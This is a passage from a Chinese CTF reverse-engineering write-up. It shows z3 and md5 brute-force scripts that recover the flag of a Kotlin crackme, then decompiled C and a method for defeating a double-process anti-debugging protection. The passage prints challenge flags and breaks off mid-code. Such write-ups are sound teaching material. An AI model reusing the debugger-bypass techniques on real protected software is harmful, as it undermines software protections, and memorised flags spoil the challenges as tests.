<span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    tmp[i]=(tmp[i] &gt;&gt; <span class="number">7</span> &lt;&lt; <span class="number">1</span> | tmp[i] &amp; <span class="number">1</span>) * <span class="number">0x40</span> + ((tmp[i] &amp; <span class="number">0x7E</span>) &gt;&gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    s.add(tmp[i]==code1[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">     model = s.model()</span><br><span class="line">     <span class="built_in">str</span> = [<span class="built_in">chr</span>(model[flag[i]].as_long().real) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)]</span><br><span class="line">     print(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>))</span><br><span class="line">     exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     print(<span class="string">&quot;no_sat&quot;</span>)</span><br><span class="line"><span class="comment">#D0g3&#123;K0tl1n&#125;</span></span><br></pre></td></tr></table></figure><p>当然，这肯定不是出题人想要的，而且如果字符多一点也没法这样做，所以还是得正常md5爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">code=<span class="string">&#x27;vNIfOQtJIkzn&#x27;</span></span><br><span class="line">xor=[<span class="number">45</span>, <span class="number">13</span>, <span class="number">55</span>, <span class="number">71</span>, <span class="number">94</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">80</span>, <span class="number">60</span>, <span class="number">71</span>, <span class="number">11</span>, <span class="number">54</span>, <span class="number">0x76</span>, <span class="number">93</span>]</span><br><span class="line">code1=[<span class="number">116</span>,<span class="number">94</span>,<span class="number">40</span>,<span class="number">58</span>,<span class="number">82</span>,<span class="number">33</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">40</span>,<span class="number">59</span>,<span class="number">114</span>,<span class="number">101</span>]</span><br><span class="line">table=[<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;K&#x27;</span>]</span><br><span class="line">tmp=[<span class="number">0</span>]*<span class="number">12</span></span><br><span class="line"><span class="built_in">len</span>=<span class="built_in">len</span>(xor)</span><br><span class="line">table1 = [[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span>(code[i]==table[j]):</span><br><span class="line">            <span class="keyword">if</span>(j&lt;=<span class="number">128</span>):</span><br><span class="line">                tmp1=((j&amp;<span class="number">0x3f</span>)&lt;&lt;<span class="number">1</span>)&amp;<span class="number">0xff</span></span><br><span class="line">                tmp2=((((j&amp;<span class="number">0x3f</span>)&lt;&lt;<span class="number">1</span>))+<span class="number">1</span>)&amp;<span class="number">0xff</span></span><br><span class="line">                table1[i].append(tmp1 ^ xor[i] &amp; <span class="number">0xff</span>)</span><br><span class="line">                table1[i].append(tmp2^xor[i]&amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="comment">#生成爆破表，由于不可逆，所以将两种情况都包括了。</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> table1[<span class="number">5</span>]:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> table1[<span class="number">6</span>]:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> table1[<span class="number">7</span>]:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> table1[<span class="number">8</span>]:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> table1[<span class="number">9</span>]:</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> table1[<span class="number">10</span>]:</span><br><span class="line">                        str1 = <span class="string">&#x27;D0g3&#123;&#x27;</span>+<span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)+<span class="built_in">chr</span>(d)+<span class="built_in">chr</span>(e)+<span class="built_in">chr</span>(f)+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">                        flag = hashlib.md5(str1.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                        <span class="keyword">if</span> flag[<span class="number">0</span>:<span class="number">32</span>] == <span class="string">&quot;EF7117D32B97D82C0607A3A06E7C78C6&quot;</span>.casefold():</span><br><span class="line">                            print(str1, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#D0g3&#123;K0tl1n&#125;</span></span><br></pre></td></tr></table></figure><h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>考点，Debug Blocker，双进程保护，win32知识，类似于mrctf的一道题。查windows api的网站<a href="http://www.yfvb.com/help/win32sdk/">http://www.yfvb.com/help/win32sdk/</a>，<a href="https://docs.microsoft.com/en-us/search/">https://docs.microsoft.com/en-us/search/</a></p><p>去花后，分析主函数<br><img src="https://i.loli.net/2021/08/02/XsNQ5rAF2jpPBDi.png"><br>对于双进程保护，两种处理方法，<a href="https://blog.csdn.net/qq_39249347/article/details/108579376">https://blog.csdn.net/qq_39249347/article/details/108579376</a></p><ul><li>静态方法，父进程对子进程处理解密后(有些子进程的代码可能是被加密的)，直接将ip跳到子进程，调试子进程。</li><li>动态方法，比较麻烦，要改汇编这些什么的，让父进程和子进程断开，将我们的调试器和子进程连起来。</li></ul><p>这里就采用第一种方法直接在3E1736地址set ip，动调出逻辑。<br><img src="https://i.loli.net/2021/08/02/IrHVudG5MWnRczS.png"><br>然后true_main主要分为4步</p><p>1.通过rand()，生成16个数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">srand((<span class="keyword">unsigned</span> __int8)v59[<span class="number">0</span>]);</span><br><span class="line">v3 = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v4 = rand();</span><br><span class="line">  v6 = v61;</span><br><span class="line">  v67[<span class="number">0</span>] = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v61 &gt;= v62 )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(Src) = <span class="number">0</span>;</span><br><span class="line">    sub_3E1E30(v60, v5, (<span class="keyword">int</span>)Src, v67[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = v60;</span><br><span class="line">    <span class="keyword">if</span> ( v62 &gt;= <span class="number">0x10</span> )</span><br><span class="line">      v7 = (<span class="keyword">void</span> **)v60[<span class="number">0</span>];</span><br><span class="line">    ++v61;</span><br><span class="line">    *((_BYTE *)v7 + v6) = v67[<span class="number">0</span>];</span><br><span class="line">    *((_BYTE *)v7 + v6 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  --v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v3 );</span><br></pre></td></tr></table></figure><p>2.将flag前16个和rand()的16个数异或</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v9 = v60;</span><br><span class="line">  v10 = v60;</span><br><span class="line">  <span class="keyword">if</span> ( v62 &gt;= <span class="number">0x10</span> )</span><br><span class="line">    v9 = (<span class="keyword">void</span> **)v60[<span class="number">0</span>];</span><br><span class="line">  v11 = v60;</span><br><span class="line">  <span class="keyword">if</span> ( v62 &gt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = (<span class="keyword">void</span> **)v60[<span class="number">0</span>];</span><br><span class="line">    v10 = (<span class="keyword">void</span> **)v60[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = (<span class="keyword">char</span> *)v9 + v8;</span><br><span class="line">  v13 = v60;</span><br><span class="line">  <span class="keyword">if</span> ( v62 &gt;= <span class="number">0x10</span> )</span><br><span class="line">    v13 = (<span class="keyword">void</span> **)v60[<span class="number">0</span>];</span><br><span class="line">  v67[<span class="number">0</span>] = (*((_BYTE *)v11 + v8 + <span class="number">32</span>) ^ *((_BYTE *)v10 + v8)) &amp; ~(*v12 &amp; *((_BYTE *)v13 + v8 + <span class="number">32</span>));</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)v66 &gt;= v65 )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(Src) = <span class="number">0</span>;</span><br><span class="line">    sub_3E1E30(v63, *(<span class="keyword">int</span> *)v66, (<span class="keyword">int</span>)Src, v67[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v64 = *(_DWORD *)v66 + <span class="number">1</span>;</span><br><span class="line">    v14 = v63;</span><br><span class="line">    <span class="keyword">if</span> ( v65 &gt;= <span class="number">0x10</span> )</span><br><span class="line">      v14 = (<span class="keyword">void</span> **)v63[<span class="number">0</span>];</span><br><span class="line">    v15 = (<span class="keyword">char</span> *)v14 + *(_DWORD *)v66;</span><br><span class="line">    v16 = v67[<span class="number">0</span>];</span><br><span class="line">    v15[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    *v15 = v16;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ++v8 &gt;= <span class="number">16</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  *(_DWORD *)v66 = v64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.flag后16位和原flag前16位异或</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">16</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   v18 = v60;</span><br><span class="line">   v19 = v60;</span><br><span class="line">   <span class="keyword">if</span> ( v62 &gt;= <span class="number">0x10</span> )</span><br><span class="line">     v18 = (<span class="keyword">void</span> **)v60[<span class="number">0</span>];</span><br><span class="line">   v20 = v60;</span><br><span class="line">   <span class="keyword">if</span> ( v62 &gt;= <span class="number">0x10</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     v20 = (<span class="keyword">void</span> **)v60[<span class="number">0</span>];</span><br><span class="line">     v19 = (<span class="keyword">void</span> **)v60[<span class="number">0</span>];</span><br><span class="line">   &#125;</span><br><span class="line">   v21 = (<span class="keyword">char</span> *)v18 + i;</span><br><span class="line">   v22 = v60;</span><br><span class="line">   <span class="keyword">if</span> ( v62 &gt;= <span class="number">0x10</span> )</span><br><span class="line">     v22 = (<span class="keyword">void</span> **)v60[<span class="number">0</span>];</span><br><span class="line">   v23 = *v21 &amp; *((_BYTE *)v22 + i - <span class="number">16</span>);</span><br><span class="line">   v24 = v64;</span><br><span class="line">   v66[<span class="number">0</span>] = (*((_BYTE *)v20 + i - <span class="number">16</span>) ^ *((_BYTE *)v19 + i)) &amp; ~v23;</span><br><span class="line">   <span class="keyword">if</span> ( v64 &gt;= v65 )</span><br><span class="line">   &#123;</span><br><span class="line">     LOBYTE(Src) = <span class="number">0</span>;</span><br><span class="line">     sub_3E1E30(v63, v64, (<span class="keyword">int</span>)Src, v66[<span class="number">0</span>]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     ++v64;</span><br><span class="line">     v25 = v63;</span><br><span class="line">     <span class="keyword">if</span> ( v65 &gt;= <span class="number">0x10</span> )</span><br><span class="line">       v25 = (<span class="keyword">void</span> **)v63[<span class="number">0</span>];</span><br><span class="line">     v26 = (<span class="keyword">char</span> *)v25 + v24;</span><br><span class="line">     v27 = v66[<span class="number">0</span>];</span><br><span class="line">     v26[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">     *v26 = v27;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>4.和key[32]相减</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</span><br><span class="line"> &#123;</span><br><span class="line">   v29 = v63;</span><br><span class="line">   <span class="keyword">if</span> ( v65 &gt;= <span class="number">0x10</span> )</span><br><span class="line">     v29 = (<span class="keyword">void</span> **)v63[<span class="number">0</span>];</span><br><span class="line">   LOBYTE(v29[j]) -= byte_3E6038[j * <span class="number">4</span>];</span><br><span class="line">   v30 = v63;</span><br><span class="line">   <span class="keyword">if</span> ( v65 &gt;= <span class="number">0x10</span> )</span><br><span class="line">     v30 = (<span class="keyword">void</span> **)v63[<span class="number">0</span>];</span><br><span class="line">   BYTE1(v30[j]) -= byte_3E6039[j * <span class="number">4</span>];</span><br><span class="line">   v31 = v63;</span><br><span class="line">   <span class="keyword">if</span> ( v65 &gt;= <span class="number">0x10</span> )</span><br><span class="line">     v31 = (<span class="keyword">void</span> **)v63[<span class="number">0</span>];</span><br><span class="line">   BYTE2(v31[j]) -= byte_3E603A[j * <span class="number">4</span>];</span><br><span class="line">   v32 = v63;</span><br><span class="line">   <span class="keyword">if</span> ( v65 &gt;= <span class="number">0x10</span> )</span><br><span class="line">     v32 = (<span class="keyword">void</span> **)v63[<span class="number">0</span>];</span><br><span class="line">   HIBYTE(v32[j]) -= byte_3E603B[j * <span class="number">4</span>];</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>要解这道题呢，由于我们知道flag格式D0g3{}，我们就可以通过爆破seed，也就是我们guess的数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//flag&#123;101010101010194836950ae9df&#125;</span></span><br><span class="line"><span class="comment">//D0g3&#123;c97d0d4cd003451c4c95ce9a5f&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">random</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> send,<span 